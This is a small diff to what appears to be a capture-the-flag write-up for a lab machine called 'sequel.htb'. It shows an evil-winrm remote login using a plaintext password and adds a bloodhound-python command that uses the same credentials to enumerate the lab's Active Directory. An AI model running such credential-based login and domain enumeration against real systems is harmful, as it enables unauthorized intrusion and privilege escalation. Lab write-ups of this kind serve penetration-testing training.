@@ -356,5 +356,11 @@ evil-winrm -i sequel.htb -u Ryan.Cooper -p 'NuclearMosquito3'
 
 ### Ryan.Cooper -> Administrator
 
+#### Bloodhound Enumeration (Remote)
 
+```
+bloodhound-python -d sequel.htb -v -u Ryan.Cooper -p NuclearMosquito3 -gc sequel.htb -c all -ns 10.129.202.159
+```
+
+I then placed all of this information into Bloodhound and was able to analyze the results.
 
